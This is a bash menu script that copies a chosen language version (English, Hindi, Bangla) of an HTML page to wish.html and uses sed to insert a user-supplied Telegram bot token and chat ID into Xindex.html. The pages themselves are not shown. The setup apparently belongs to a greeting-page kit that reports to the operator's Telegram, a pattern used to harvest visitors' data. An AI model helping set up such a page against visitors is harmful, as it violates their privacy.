#!/bin/bash

# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Header
clear
echo -e "${CYAN}=========================================="
echo -e "${YELLOW}      🌐 Convert Language to wish.html"
echo -e "${CYAN}==========================================${NC}"

# Menu
echo -e "${WHITE}Select a language to generate wish.html:\n"
echo -e "${GREEN}  1) English"
echo ""
echo -e "${YELLOW}  2) Hindi"
echo ""
echo -e "${CYAN}  3) Bangla${NC}"
echo ""
echo -e "${RED}  4) Add Telegram token&id${NC}"
echo ""

read -p $'\033[1;34mEnter option (1/2/3/4): \033[0m' option
echo ""

case "$option" in
  1)
    if [ -f z2.html ]; then
      cp z2.html wish.html
      echo -e "${GREEN}✅ English converted to wish.html${NC}"
    else
      echo -e "${RED}❌ z2.html not found!${NC}"
    fi
    ;;
  2)
    if [ -f z3.html ]; then
      cp z3.html wish.html
      echo -e "${YELLOW}✅ Hindi converted to wish.html${NC}"
    else
      echo -e "${RED}❌ z3.html not found!${NC}"
    fi
    ;;
  3)
    if [ -f z1.html ]; then
      cp z1.html wish.html
      echo -e "${CYAN}✅ Bangla converted to wish.html${NC}"
    else
      echo -e "${RED}❌ z1.html not found!${NC}"
    fi
    ;;
  4)
    if [ -f Xindex.html ]; then
      echo -e "${CYAN}Enter your Telegram Bot Token:${NC}"
      read botToken

      echo -e "${CYAN}Enter your Telegram Chat ID:${NC}"
      read chatId

      # Check if file exists
      FILE="Xindex.html"
      if [ -f "$FILE" ]; then
        # Replace lines in the file
        sed -i "s|const botToken = '.*';|const botToken = '${botToken}';|" "$FILE"
        sed -i "s|const chatId = '.*';|const chatId = '${chatId}';|" "$FILE"
        echo -e "${GREEN}✅ Bot Token and Chat ID successfully updated in ${FILE}${NC}"
      else
        echo -e "${RED}❌ File ${FILE} not found!${NC}"
      fi
    else
      echo -e "${RED}❌ Xindex.html not found!${NC}"
    fi
    ;;
  *)
    echo -e "${RED}❌ Invalid option! Please choose 1, 2, 3 or 4.${NC}"
    ;;
esac